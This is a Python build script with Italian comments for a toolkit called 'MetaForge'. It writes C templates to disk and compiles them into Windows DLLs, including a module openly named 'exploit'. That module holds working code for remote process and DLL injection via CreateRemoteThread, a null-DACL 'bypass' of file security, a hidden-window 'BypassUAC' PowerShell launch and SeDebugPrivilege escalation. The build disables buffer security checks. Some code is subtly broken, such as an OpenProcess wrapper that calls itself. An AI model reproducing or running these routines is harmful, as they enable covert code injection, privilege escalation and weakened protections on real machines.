import os
import subprocess
from pathlib import Path
import sys

def generate_c_code(mf_file, output_dir):
    """Generate C code from MetaForge file"""
    source = Path(mf_file).read_text(encoding='utf-8')
    output_file = output_dir / f"{Path(mf_file.stem)}.c"
    
    # Scegli il template in base al tipo di file
    if mf_file.name == "win_api.mf":
        c_code = """
#define UMDF_USING_NTSTATUS
#define WIN32_NO_STATUS

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

// Wrapper functions
__declspec(dllexport) HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) {
    return OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);
}

__declspec(dllexport) HANDLE __stdcall OpenRegistryKey(LPCWSTR lpSubKey, DWORD dwDesiredAccess) {
    HKEY hKey = NULL;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, lpSubKey, 0, dwDesiredAccess, &hKey) == ERROR_SUCCESS) {
        return hKey;
    }
    return NULL;
}

__declspec(dllexport) BOOL __stdcall WriteRegistryValue(HANDLE hKey, LPCWSTR lpValueName, DWORD dwType, LPCVOID lpData, DWORD cbData) {
    return RegSetValueExW((HKEY)hKey, lpValueName, 0, dwType, (const BYTE*)lpData, cbData) == ERROR_SUCCESS;
}
"""
    elif mf_file.name == "memory.mf":
        c_code = """
#define UMDF_USING_NTSTATUS
#define WIN32_NO_STATUS

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

// Forward declarations
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    IN HANDLE ProcessHandle,
    IN OUT PVOID *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

typedef NTSTATUS (NTAPI *NtReadVirtualMemory_t)(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    OUT PVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesRead OPTIONAL
);

// Global variables
static HMODULE hNtdll = NULL;
static NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = NULL;
static NtReadVirtualMemory_t pNtReadVirtualMemory = NULL;

// Initialize function pointers
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (hNtdll) {
                pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
                pNtReadVirtualMemory = (NtReadVirtualMemory_t)GetProcAddress(hNtdll, "NtReadVirtualMemory");
            }
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// Wrapper functions
__declspec(dllexport) LPVOID __stdcall AllocateMemory(HANDLE hProcess, SIZE_T dwSize) {
    PVOID baseAddress = NULL;
    SIZE_T regionSize = dwSize;
    
    NTSTATUS status = pNtAllocateVirtualMemory(
        hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    return NT_SUCCESS(status) ? baseAddress : NULL;
}

__declspec(dllexport) BOOL __stdcall ReadMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize) {
    SIZE_T bytesRead;
    
    NTSTATUS status = pNtReadVirtualMemory(
        hProcess,
        (PVOID)lpBaseAddress,
        lpBuffer,
        nSize,
        &bytesRead
    );
    
    return NT_SUCCESS(status);
}
"""
    elif mf_file.name == "registry.mf":
        c_code = """
#define UMDF_USING_NTSTATUS
#define WIN32_NO_STATUS

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>

#pragma comment(lib, "ntdll.lib")

// Registry information class
typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    KeyValueLayerInformation,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

// Registry value information structure
typedef struct _KEY_VALUE_FULL_INFORMATION {
    ULONG TitleIndex;
    ULONG Type;
    ULONG DataOffset;
    ULONG DataLength;
    ULONG NameLength;
    WCHAR Name[1];
} KEY_VALUE_FULL_INFORMATION, *PKEY_VALUE_FULL_INFORMATION;

#define STATUS_BUFFER_TOO_SMALL ((NTSTATUS)0xC0000023L)

// Forward declarations
typedef NTSTATUS (NTAPI *NtOpenKey_t)(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
);

typedef NTSTATUS (NTAPI *NtQueryValueKey_t)(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
);

typedef NTSTATUS (NTAPI *NtSetValueKey_t)(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN ULONG TitleIndex OPTIONAL,
    IN ULONG Type,
    IN PVOID Data,
    IN ULONG DataSize
);

// Global variables
static HMODULE hNtdll = NULL;
static NtOpenKey_t pNtOpenKey = NULL;
static NtQueryValueKey_t pNtQueryValueKey = NULL;
static NtSetValueKey_t pNtSetValueKey = NULL;

// Initialize function pointers
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            hNtdll = GetModuleHandleW(L"ntdll.dll");
            if (hNtdll) {
                pNtOpenKey = (NtOpenKey_t)GetProcAddress(hNtdll, "NtOpenKey");
                pNtQueryValueKey = (NtQueryValueKey_t)GetProcAddress(hNtdll, "NtQueryValueKey");
                pNtSetValueKey = (NtSetValueKey_t)GetProcAddress(hNtdll, "NtSetValueKey");
            }
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}

// Wrapper functions
__declspec(dllexport) HANDLE __stdcall OpenRegistryKey(LPCWSTR lpSubKey, DWORD dwDesiredAccess) {
    HANDLE hKey = NULL;
    OBJECT_ATTRIBUTES oa = {sizeof(OBJECT_ATTRIBUTES)};
    UNICODE_STRING usKeyName;
    RtlInitUnicodeString(&usKeyName, lpSubKey);
    oa.ObjectName = &usKeyName;
    
    if (pNtOpenKey) {
        pNtOpenKey(&hKey, dwDesiredAccess, &oa);
    }
    return hKey;
}

__declspec(dllexport) LPVOID __stdcall ReadRegistryValue(HANDLE hKey, LPCWSTR lpValueName) {
    if (!pNtQueryValueKey) return NULL;
    
    UNICODE_STRING usValueName;
    RtlInitUnicodeString(&usValueName, lpValueName);
    
    // First query to get size
    ULONG resultLength = 0;
    NTSTATUS status = pNtQueryValueKey(
        hKey,
        &usValueName,
        KeyValueFullInformation,
        NULL,
        0,
        &resultLength
    );
    
    if (status != STATUS_BUFFER_TOO_SMALL) return NULL;
    
    // Allocate buffer
    PKEY_VALUE_FULL_INFORMATION kvfi = (PKEY_VALUE_FULL_INFORMATION)malloc(resultLength);
    if (!kvfi) return NULL;
    
    // Get value data
    status = pNtQueryValueKey(
        hKey,
        &usValueName,
        KeyValueFullInformation,
        kvfi,
        resultLength,
        &resultLength
    );
    
    if (!NT_SUCCESS(status)) {
        free(kvfi);
        return NULL;
    }
    
    // Copy data to new buffer
    LPVOID data = malloc(kvfi->DataLength + sizeof(DWORD));
    if (!data) {
        free(kvfi);
        return NULL;
    }
    
    *(DWORD*)data = kvfi->DataLength;
    memcpy((BYTE*)data + sizeof(DWORD), 
           (BYTE*)kvfi + kvfi->DataOffset,
           kvfi->DataLength);
    
    free(kvfi);
    return data;
}

__declspec(dllexport) BOOL __stdcall WriteRegistryValue(HANDLE hKey, LPCWSTR lpValueName, DWORD dwType, LPCVOID lpData, DWORD cbData) {
    if (!pNtSetValueKey) return FALSE;
    
    UNICODE_STRING usValueName;
    RtlInitUnicodeString(&usValueName, lpValueName);
    
    NTSTATUS status = pNtSetValueKey(hKey, &usValueName, 0, dwType, (PVOID)lpData, cbData);
    return NT_SUCCESS(status);
}
"""
    elif mf_file.name == "hash.mf":
        c_code = """
#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

typedef struct _HashContext {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    DWORD algorithm;
} HashContext;

__declspec(dllexport) HashContext* __stdcall InitHash(DWORD algorithm) {
    HashContext* ctx = (HashContext*)malloc(sizeof(HashContext));
    if (!ctx) return NULL;
    
    if (!CryptAcquireContext(&ctx->hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        free(ctx);
        return NULL;
    }
    
    DWORD algId;
    switch(algorithm) {
        case 1: algId = CALG_MD5; break;
        case 2: algId = CALG_SHA1; break;
        case 3: algId = CALG_SHA_256; break;
        default: 
            CryptReleaseContext(ctx->hProv, 0);
            free(ctx);
            return NULL;
    }
    
    if (!CryptCreateHash(ctx->hProv, algId, 0, 0, &ctx->hHash)) {
        CryptReleaseContext(ctx->hProv, 0);
        free(ctx);
        return NULL;
    }
    
    ctx->algorithm = algorithm;
    return ctx;
}

__declspec(dllexport) BOOL __stdcall UpdateHash(HashContext* ctx, BYTE* data, DWORD length) {
    if (!ctx || !ctx->hHash) return FALSE;
    return CryptHashData(ctx->hHash, data, length, 0);
}

__declspec(dllexport) BYTE* __stdcall FinalizeHash(HashContext* ctx) {
    if (!ctx || !ctx->hHash) return NULL;
    
    DWORD hashLen;
    DWORD paramLen = sizeof(DWORD);
    CryptGetHashParam(ctx->hHash, HP_HASHSIZE, (BYTE*)&hashLen, &paramLen, 0);
    
    BYTE* hash = (BYTE*)malloc(hashLen);
    if (!hash) return NULL;
    
    if (!CryptGetHashParam(ctx->hHash, HP_HASHVAL, hash, &hashLen, 0)) {
        free(hash);
        return NULL;
    }
    
    CryptDestroyHash(ctx->hHash);
    CryptReleaseContext(ctx->hProv, 0);
    free(ctx);
    
    return hash;
}
"""
    elif mf_file.name == "cipher.mf":
        c_code = """
#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")

typedef struct _CipherContext {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    BYTE* iv;
    DWORD mode;
} CipherContext;

__declspec(dllexport) CipherContext* __stdcall InitCipher(BYTE* key, DWORD keySize, BYTE* iv, DWORD mode) {
    CipherContext* ctx = (CipherContext*)malloc(sizeof(CipherContext));
    if (!ctx) return NULL;
    
    if (!CryptAcquireContext(&ctx->hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        free(ctx);
        return NULL;
    }
    
    HCRYPTHASH hHash;
    if (!CryptCreateHash(ctx->hProv, CALG_SHA_256, 0, 0, &hHash)) {
        CryptReleaseContext(ctx->hProv, 0);
        free(ctx);
        return NULL;
    }
    
    if (!CryptHashData(hHash, key, keySize, 0)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(ctx->hProv, 0);
        free(ctx);
        return NULL;
    }
    
    if (!CryptDeriveKey(ctx->hProv, CALG_AES_256, hHash, 0, &ctx->hKey)) {
        CryptDestroyHash(hHash);
        CryptReleaseContext(ctx->hProv, 0);
        free(ctx);
        return NULL;
    }
    
    CryptDestroyHash(hHash);
    
    if (iv) {
        ctx->iv = (BYTE*)malloc(16);
        memcpy(ctx->iv, iv, 16);
    } else {
        ctx->iv = NULL;
    }
    
    ctx->mode = mode;
    return ctx;
}

__declspec(dllexport) BYTE* __stdcall EncryptBlock(CipherContext* ctx, BYTE* data, DWORD size) {
    if (!ctx || !ctx->hKey) return NULL;
    
    BYTE* encrypted = (BYTE*)malloc(size);
    if (!encrypted) return NULL;
    
    memcpy(encrypted, data, size);
    DWORD encLen = size;
    
    if (ctx->mode == 1 && ctx->iv) { // CBC mode
        if (!CryptSetKeyParam(ctx->hKey, KP_IV, ctx->iv, 0)) {
            free(encrypted);
            return NULL;
        }
    }
    
    if (!CryptEncrypt(ctx->hKey, 0, TRUE, 0, encrypted, &encLen, size)) {
        free(encrypted);
        return NULL;
    }
    
    return encrypted;
}

__declspec(dllexport) BYTE* __stdcall DecryptBlock(CipherContext* ctx, BYTE* data, DWORD size) {
    if (!ctx || !ctx->hKey) return NULL;
    
    BYTE* decrypted = (BYTE*)malloc(size);
    if (!decrypted) return NULL;
    
    memcpy(decrypted, data, size);
    DWORD decLen = size;
    
    if (ctx->mode == 1 && ctx->iv) { // CBC mode
        if (!CryptSetKeyParam(ctx->hKey, KP_IV, ctx->iv, 0)) {
            free(decrypted);
            return NULL;
        }
    }
    
    if (!CryptDecrypt(ctx->hKey, 0, TRUE, 0, decrypted, &decLen)) {
        free(decrypted);
        return NULL;
    }
    
    return decrypted;
}
"""
    elif mf_file.name == "bypass.mf":
        c_code = """
#include <windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef struct _SecurityContext {
    PSECURITY_DESCRIPTOR originalSd;
    PSECURITY_DESCRIPTOR modifiedSd;
    DWORD type;
} SecurityContext;

__declspec(dllexport) SecurityContext* __stdcall BypassSecurityDescriptor(LPWSTR objectPath, DWORD type) {
    SecurityContext* ctx = (SecurityContext*)malloc(sizeof(SecurityContext));
    if (!ctx) return NULL;
    
    // Get original security descriptor
    DWORD sdSize = 0;
    GetFileSecurity(objectPath, type, NULL, 0, &sdSize);
    ctx->originalSd = (PSECURITY_DESCRIPTOR)malloc(sdSize);
    if (!GetFileSecurity(objectPath, type, ctx->originalSd, sdSize, &sdSize)) {
        free(ctx);
        return NULL;
    }
    
    // Create null security descriptor
    ctx->modifiedSd = (PSECURITY_DESCRIPTOR)malloc(SECURITY_DESCRIPTOR_MIN_LENGTH);
    if (!InitializeSecurityDescriptor(ctx->modifiedSd, SECURITY_DESCRIPTOR_REVISION)) {
        free(ctx->originalSd);
        free(ctx);
        return NULL;
    }
    
    // Set null DACL
    if (!SetSecurityDescriptorDacl(ctx->modifiedSd, TRUE, NULL, FALSE)) {
        free(ctx->originalSd);
        free(ctx->modifiedSd);
        free(ctx);
        return NULL;
    }
    
    ctx->type = type;
    return ctx;
}

__declspec(dllexport) BOOL __stdcall RestoreSecurity(SecurityContext* ctx, LPWSTR objectPath) {
    if (!ctx) return FALSE;
    
    BOOL result = SetFileSecurity(objectPath, ctx->type, ctx->originalSd);
    
    free(ctx->originalSd);
    free(ctx->modifiedSd);
    free(ctx);
    
    return result;
}

__declspec(dllexport) BOOL __stdcall BypassUAC(void) {
    SHELLEXECUTEINFO sei = {sizeof(sei)};
    sei.lpVerb = L"runas";
    sei.lpFile = L"cmd.exe";
    sei.lpParameters = L"/c powershell -WindowStyle Hidden -Command Start-Process -Verb RunAs";
    sei.nShow = SW_HIDE;
    
    return ShellExecuteEx(&sei);
}
"""
    elif mf_file.name == "injection.mf":
        c_code = """
#include <windows.h>
#include <winternl.h>

typedef struct _InjectionContext {
    HANDLE process;
    LPVOID code;
    SIZE_T size;
    LPVOID remoteBase;
} InjectionContext;

__declspec(dllexport) InjectionContext* __stdcall PrepareInjection(DWORD pid, LPVOID code, SIZE_T size) {
    InjectionContext* ctx = (InjectionContext*)malloc(sizeof(InjectionContext));
    if (!ctx) return NULL;
    
    ctx->process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!ctx->process) {
        free(ctx);
        return NULL;
    }
    
    ctx->remoteBase = VirtualAllocEx(ctx->process, NULL, size, 
                                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!ctx->remoteBase) {
        CloseHandle(ctx->process);
        free(ctx);
        return NULL;
    }
    
    ctx->code = code;
    ctx->size = size;
    return ctx;
}

__declspec(dllexport) BOOL __stdcall InjectCode(InjectionContext* ctx) {
    if (!ctx) return FALSE;
    
    SIZE_T written;
    if (!WriteProcessMemory(ctx->process, ctx->remoteBase, ctx->code, ctx->size, &written)) {
        return FALSE;
    }
    
    HANDLE thread = CreateRemoteThread(ctx->process, NULL, 0, 
                                     (LPTHREAD_START_ROUTINE)ctx->remoteBase, 
                                     NULL, 0, NULL);
    if (!thread) {
        return FALSE;
    }
    
    CloseHandle(thread);
    return TRUE;
}

__declspec(dllexport) BOOL __stdcall InjectDLL(DWORD pid, LPCSTR dllPath) {
    HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!process) return FALSE;
    
    SIZE_T pathSize = strlen(dllPath) + 1;
    LPVOID remotePath = VirtualAllocEx(process, NULL, pathSize, 
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remotePath) {
        CloseHandle(process);
        return FALSE;
    }
    
    if (!WriteProcessMemory(process, remotePath, dllPath, pathSize, NULL)) {
        VirtualFreeEx(process, remotePath, 0, MEM_RELEASE);
        CloseHandle(process);
        return FALSE;
    }
    
    HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
    LPVOID loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");
    
    HANDLE thread = CreateRemoteThread(process, NULL, 0, 
                                     (LPTHREAD_START_ROUTINE)loadLibrary,
                                     remotePath, 0, NULL);
    if (!thread) {
        VirtualFreeEx(process, remotePath, 0, MEM_RELEASE);
        CloseHandle(process);
        return FALSE;
    }
    
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFreeEx(process, remotePath, 0, MEM_RELEASE);
    CloseHandle(process);
    
    return TRUE;
}
"""
    elif mf_file.name == "privilege.mf":
        c_code = """
#include <windows.h>
#include <winternl.h>

typedef struct _TokenPrivileges {
    HANDLE token;
    DWORD privileges;
} TokenPrivileges;

__declspec(dllexport) BOOL __stdcall EnablePrivilege(LPCSTR privilegeName) {
    HANDLE token;
    HANDLE process = GetCurrentProcess();
    
    if (!OpenProcessToken(process, TOKEN_ALL_ACCESS, &token)) {
        return FALSE;
    }
    
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
        CloseHandle(token);
        return FALSE;
    }
    
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    BOOL result = AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    DWORD error = GetLastError();
    
    CloseHandle(token);
    return result && error == ERROR_SUCCESS;
}

__declspec(dllexport) BOOL __stdcall ElevateProcess(void) {
    return EnablePrivilege("SeDebugPrivilege");
}
"""
    else:
        # ... codice esistente per gli altri file ...
        pass
    
    output_file.write_text(c_code)
    return output_file

def compile_metaforge():
    """Compile MetaForge wrappers to DLL"""
    # Base paths
    metaforge_path = Path("metaforge")
    
    # Create all required directories
    directories = {
        "core": metaforge_path / "core",
        "crypto": metaforge_path / "crypto",
        "exploit": metaforge_path / "exploit"
    }
    
    for dir_path in directories.values():
        dir_path.mkdir(parents=True, exist_ok=True)
    
    # Find SDK and VS paths
    sdk_path = r"C:\Program Files (x86)\Windows Kits\10"
    sdk_include = os.path.join(sdk_path, "Include", "10.0.22621.0")
    sdk_lib = os.path.join(sdk_path, "Lib", "10.0.22621.0")
    
    vs_path = r"C:\Program Files\Microsoft Visual Studio\2022\Community"
    vs_include = os.path.join(vs_path, "VC", "Tools", "MSVC", "14.38.33135", "include")
    vs_lib = os.path.join(vs_path, "VC", "Tools", "MSVC", "14.38.33135", "lib", "x64")
    
    ucrt_include = os.path.join(sdk_include, "ucrt")
    ucrt_lib = os.path.join(sdk_lib, "ucrt", "x64")
    
    # Files to compile with their output directories
    files_to_compile = {
        "core": ["win_api.mf", "memory.mf", "registry.mf"],
        "crypto": ["hash.mf", "cipher.mf"],
        "exploit": ["privilege.mf", "injection.mf", "bypass.mf"]
    }
    
    # Common compiler settings
    include_paths = [
        f"/I\"{ucrt_include}\"",
        f"/I\"{vs_include}\"",
        f"/I\"{os.path.join(sdk_include, 'shared')}\"",
        f"/I\"{os.path.join(sdk_include, 'um')}\"",
        f"/I\"{os.path.join(sdk_include, 'km')}\"",
        f"/I\"{os.path.join(sdk_include, 'wdf')}\""
    ]
    
    lib_paths = [
        f"/LIBPATH:\"{ucrt_lib}\"",
        f"/LIBPATH:\"{vs_lib}\"",
        f"/LIBPATH:\"{os.path.join(sdk_lib, 'um', 'x64')}\"",
        f"/LIBPATH:\"{os.path.join(sdk_lib, 'km', 'x64')}\""
    ]
    
    # Libraries needed for each module
    module_libs = {
        "core": ["ntdll.lib", "kernel32.lib", "advapi32.lib"],
        "crypto": ["ntdll.lib", "kernel32.lib", "advapi32.lib", "crypt32.lib"],
        "exploit": ["ntdll.lib", "kernel32.lib", "advapi32.lib", "shell32.lib", "user32.lib"]
    }
    
    # Compile each module
    for module, files in files_to_compile.items():
        module_dir = directories[module]
        
        for file in files:
            source = module_dir / file
            print(f"Creating wrapper for {module}/{file}...")
            
            try:
                if not source.exists():
                    raise FileNotFoundError(f"Source file not found: {source}")
                
                # Generate wrapper
                wrapper_file = generate_c_code(source, module_dir)
                output = module_dir / file.replace(".mf", ".dll")
                
                compile_cmd = [
                    "cl.exe",
                    "/LD",  # Create DLL
                    "/MD",  # Use multi-threaded DLL runtime
                    "/Fe:" + str(output),  # Output file
                    *include_paths,
                    "/O2",  # Optimize for speed
                    "/GS-",  # Disable buffer security check
                    "/D", "WIN32",
                    "/D", "_WINDOWS",
                    "/D", "_USRDLL",
                    "/D", "NDEBUG",
                    "/D", "_UNICODE",
                    "/D", "UNICODE",
                    str(wrapper_file),
                    "/link",
                    "/NODEFAULTLIB:libcmt.lib",
                    *lib_paths,
                    *module_libs[module],  # Add module-specific libraries
                    "ucrt.lib",
                    "vcruntime.lib",
                    "msvcrt.lib"
                ]
                
                # Create compilation batch file
                batch_file = module_dir / "compile.bat"
                with open(batch_file, "w") as f:
                    f.write(f'@echo off\n')
                    f.write(f'call "{vs_path}\\VC\\Auxiliary\\Build\\vcvars64.bat"\n')
                    f.write(" ".join(compile_cmd))
                
                # Run compilation
                subprocess.run([str(batch_file)], check=True)
                print(f"Successfully compiled {module}/{file}")
                
            except Exception as e:
                print(f"Error compiling {module}/{file}: {str(e)}")
                continue
    
    print("\nCompilation complete!")

if __name__ == "__main__":
    try:
        compile_metaforge()
    except Exception as e:
        print(f"\nError during compilation: {str(e)}")
        sys.exit(1) 